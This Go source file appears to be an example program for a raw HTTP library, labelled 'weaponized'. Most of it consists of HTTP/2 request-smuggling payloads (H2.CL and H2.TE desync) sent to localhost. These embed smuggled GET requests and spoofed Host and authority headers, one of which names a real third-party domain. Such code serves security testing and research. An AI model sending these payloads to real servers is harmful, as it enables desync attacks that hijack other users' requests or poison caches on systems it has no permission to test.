package main

import (
	"log"
	"net"
	"strings"

	"github.com/projectdiscovery/rawhttp/tls"

	// normal
	// "net/http"
	// "golang.org/x/net/http2"
	// weaponized
	"github.com/projectdiscovery/rawhttp/http"
	"github.com/projectdiscovery/rawhttp/http2"
)

func main() {
	client := http.Client{
		Transport: &http2.Transport{
			AllowHTTP: true,
			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
				return net.Dial(network, addr)
			},
		},
	}

	req, err := http.NewRequest("GET", "http://localhost:80", nil)
	if err != nil {
		log.Fatal(err)
	}
	// some malformed header
	req.Header.Add("TeSt   ", "test")
	req.Header["Test"] = []string{"test"}

	resp, err := client.Do(req)
	log.Println(resp, err)

	// https://youtu.be/gAnDUoq1NzQ?t=672 - H2.CL desync
	payload := "abcdGET /n HTTP/1.1\r\nHost: 02.rs?localhost\r\nFoo: bar"
	req1, err := http.NewRequest(http.MethodPost, "http://localhost:80/n", strings.NewReader(payload))
	if err != nil {
		log.Fatal(err)
	}
	req1.Header.Add(":content-length", "4")
	req1.AutomaticContentLength = false
	req1.Unsafe = true
	resp, err = client.Do(req1)
	log.Println(resp, err)

	// https://youtu.be/gAnDUoq1NzQ?t=672 - H2.TE desync
	payload = "0\r\n\r\n\r\nGET /oops HTTP/1.1\r\nHost: pares.net\r\nContent-Length: 10\r\n\r\n\r\nX="
	req1, err = http.NewRequest(http.MethodPost, "http://localhost:80/identify/XUI", strings.NewReader(payload))
	if err != nil {
		log.Fatal(err)
	}
	req1.Header[":authority"] = []string{"id.b2b.oath.com"}
	req1.Header["transfer-encoding"] = []string{"chunked"}
	req1.AutomaticContentLength = false
	req1.AutomaticHostHeader = false
	req1.AutomaticUserAgent = false
	req1.AutomaticAcceptEndocing = false
	req1.AutomaticScheme = false
	req1.Unsafe = true
	resp, err = client.Do(req1)
	log.Println(resp, err)
}
